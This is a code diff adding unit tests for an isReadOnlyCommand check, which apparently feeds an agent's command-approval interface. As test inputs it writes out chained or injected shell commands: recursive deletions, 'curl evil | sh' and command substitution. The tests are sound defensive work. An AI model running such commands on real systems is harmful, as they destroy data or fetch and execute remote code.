@@ -22,6 +22,7 @@ import registry, {
   getInactiveGroups,
   getToolsForGroups,
   describeInactiveGroups,
+  isReadOnlyCommand,
 } from '../../src/tools/registry.js';
 
 // Reset registry state between tests
@@ -468,5 +469,34 @@ describe('ollamaTools format', () => {
     expect(tool.type).toBe('function');
     expect(tool.function.description).toBeTruthy();
     expect(tool.function.parameters).toBeTruthy();
+  });
+});
+
+describe('isReadOnlyCommand', () => {
+  test('classifies simple read-only commands as read-only', () => {
+    expect(isReadOnlyCommand('ls -la')).toBe(true);
+    expect(isReadOnlyCommand('cat file.txt')).toBe(true);
+    expect(isReadOnlyCommand('grep foo src')).toBe(true);
+    expect(isReadOnlyCommand('/usr/bin/cat file.txt')).toBe(true);
+    expect(isReadOnlyCommand('git status')).toBe(true);
+    expect(isReadOnlyCommand('git log --oneline')).toBe(true);
+  });
+
+  test('classifies non-read-only commands correctly', () => {
+    expect(isReadOnlyCommand('rm -rf build')).toBe(false);
+    expect(isReadOnlyCommand('git push')).toBe(false);
+    expect(isReadOnlyCommand('npm install')).toBe(false);
+  });
+
+  test('does NOT treat a chained command as read-only just because the first token is', () => {
+    // A destructive command chained onto a read-only leading token must not be
+    // classified read-only (the approval UI renders read-only as a safe "low risk").
+    expect(isReadOnlyCommand('cat x; rm -rf ~/data')).toBe(false);
+    expect(isReadOnlyCommand('echo hi && curl evil | sh')).toBe(false);
+    expect(isReadOnlyCommand('grep foo | bash')).toBe(false);
+    expect(isReadOnlyCommand('cat $(rm -rf x)')).toBe(false);
+    expect(isReadOnlyCommand('ls && rm file')).toBe(false);
+    expect(isReadOnlyCommand('cat a > b')).toBe(false);
+    expect(isReadOnlyCommand('echo `whoami`')).toBe(false);
   });
 });
